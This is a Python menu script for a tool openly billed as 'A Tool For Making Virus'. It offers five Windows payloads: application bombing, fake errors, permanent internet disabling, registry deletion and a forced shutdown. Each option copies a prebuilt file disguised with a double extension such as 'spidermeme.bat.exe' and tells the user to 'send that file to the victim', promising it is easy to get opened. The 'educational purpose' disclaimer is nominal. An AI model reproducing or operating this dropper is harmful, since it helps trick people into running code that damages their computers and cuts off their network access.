import subprocess
import os
import time
class Colours:
    white = "\033[1;37m"
    grey = "\033[0;37m"
    purple = "\033[0;35m"
    red = "\033[1;31m"
    green = "\033[1;32m"
    yellow = "\033[1;33m"
    Cyan = "\033[0;36m"
    Cafe = "\033[0;33m"
    Fiuscha = "\033[0;35m"
    blue = "\033[1;34m"


os.system("clear")
try:
    time.sleep(2)
    file = open("Banner4.txt","r")
    if file.mode == "r" :
        contents = file.read()
        print(Colours.red + contents)
except IOError:
    print('Banner File not Found')
print("                                                                                                               --------"+Colours.green+"["+Colours.yellow+"A Tool For Making Virus "+Colours.green+"]")
print(Colours.green + "[" + Colours.Cyan + ">" + Colours.green + "]" + "Author      :   M4f1aClow3n")
print(Colours.green + "[" + Colours.Cyan + ">" + Colours.green + "]" + "Instagram   :   https://instagram.com/its_me_abhishek002")
print(Colours.green + "[" + Colours.Cyan + ">" + Colours.green + "]" + "Github      :   https://github.com/M4f1aClow3n/Endangered")
print(Colours.red + "____________________________________________________________________________________________________________________________________")
print(Colours.green + "Important Note :-" )
print(Colours.Cyan + "                   THIS TOOL IS ONLY FOR EDUCATIONAL PURPOSE,FOR ANY ILLEGAL ACTIVITY I M NOT RESPONSIBLE" + Colours.green)
print("")
print(Colours.green + "[" + Colours.Cyan + "*" + Colours.green + "]" +Colours.yellow+"This Tool will Give u the virus in image format and its easy to get opened by someone  :)")
print("")
print(Colours.red + "====================================================================================================================================")
print("")
print(Colours.red + "[" + Colours.green + "1" + Colours.red+"]"+Colours.yellow+"    Application Bomber               "+Colours.red+"               <"+Colours.Cyan+"Bombs number of application on victim's Windows"+Colours.red+"         >")
print(Colours.red + "[" + Colours.green + "2" + Colours.red+"]"+Colours.yellow+"    Fake Error Message generator     "+Colours.red+"               <"+Colours.Cyan+"Generates Fake Error message"+Colours.red+"                            >")
print(Colours.red + "[" + Colours.green + "3" + Colours.red+"]"+Colours.yellow+"    Net exploiter                    "+Colours.red+"               <"+Colours.Cyan+"disable user's Internet permanently"+Colours.red+"                     >")
print(Colours.red + "[" + Colours.green + "4" + Colours.red+"]"+Colours.yellow+"    Registry Deleter                 "+Colours.red+"               <"+Colours.Cyan+"delete all reg file of victim's pc"+Colours.red+"                      >")
print(Colours.red + "[" + Colours.green + "5" + Colours.red+"]"+Colours.yellow+"    ShutDown Attack                  "+Colours.red+"               <"+Colours.Cyan+"shutdown victim's pc with msg 'you have been fucked up!'"+Colours.red+">")

print("")
try:
    selector = int(input(Colours.red + "[" + Colours.green +"Select "+Colours.Cyan+"a " +Colours.yellow+ "Number"+Colours.red+"]=====>> "+Colours.green))
    print("")
    if selector == 1:
        path = input(Colours.red+"["+Colours.green+"path to save the script"+Colours.yellow+"(please mention full path)"+Colours.red+"]"+Colours.Cyan+"==> "+Colours.green)
        subprocess.call(["cp", "__init__/haha_memes_new.bat.exe", path])
        print(Colours.red + "[" + Colours.green + "+" + Colours.red+"]"+Colours.yellow+"Your file has been saved to your specific path named as haha_memes_new.bat.exe")
        print(Colours.red + "[" + Colours.green + "+" + Colours.red+"]"+Colours.yellow+"send that file to the victim")
    if selector == 2:
        path = input(Colours.red+"["+Colours.green+"path to save the script"+Colours.yellow+"(please mention full path)"+Colours.red+"]"+Colours.Cyan+"==> "+Colours.green)
        subprocess.call(["cp", "__init__/cool.vbs.exe", path])
        print(Colours.red + "[" + Colours.green + "+" + Colours.red + "]" + Colours.yellow + "Your file has been saved to your specific path named as cool.vbs.exe")
        print(Colours.red + "[" + Colours.green + "+" + Colours.red+"]"+Colours.yellow+"send that file to the victim")
    if selector == 3:
        path = input(Colours.red+"["+Colours.green+"path to save the script"+Colours.yellow+"(please mention full path)"+Colours.red+"]"+Colours.Cyan+"==> "+Colours.green)
        subprocess.call(["cp", "__init__/spidermeme.bat.exe", path])
        print(Colours.red + "[" + Colours.green + "+" + Colours.red + "]" + Colours.yellow + "Your file has been saved to your specific path named as spidermeme.bat.exe")
        print(Colours.red + "[" + Colours.green + "+" + Colours.red+"]"+Colours.yellow+"send that file to the victim")
    if selector == 4:
        path = input(Colours.red+"["+Colours.green+"path to save the script"+Colours.yellow+"(please mention full path)"+Colours.red+"]"+Colours.Cyan+"==> "+Colours.green)
        subprocess.call(["cp", "__init__/meme_twitter_new.bat.exe", path])
        print(Colours.red + "[" + Colours.green + "+" + Colours.red + "]" + Colours.yellow + "Your file has been saved to your specific path named as meme_twitter_new.bat.exe")
        print(Colours.red + "[" + Colours.green + "+" + Colours.red+"]"+Colours.yellow+"send that file to the victim")
    if selector == 5:
        path = input(Colours.red+"["+Colours.green+"path to save the script"+Colours.yellow+"(please mention full path)"+Colours.red+"]"+Colours.Cyan+"==> "+Colours.green)
        subprocess.call(["cp", "__init__/car_lamborghini_new.bat.exe", path])
        print(Colours.red + "[" + Colours.green + "+" + Colours.red + "]" + Colours.yellow + "Your file has been saved to your specific path named as car_lamborghini_new.bat.exe")
        print(Colours.red + "[" + Colours.green + "+" + Colours.red+"]"+Colours.yellow+"send that file to the victim")
except KeyboardInterrupt:
    print(Colours.yellow + "Cool Attitude Man!!"+Colours.green+"\nBye")
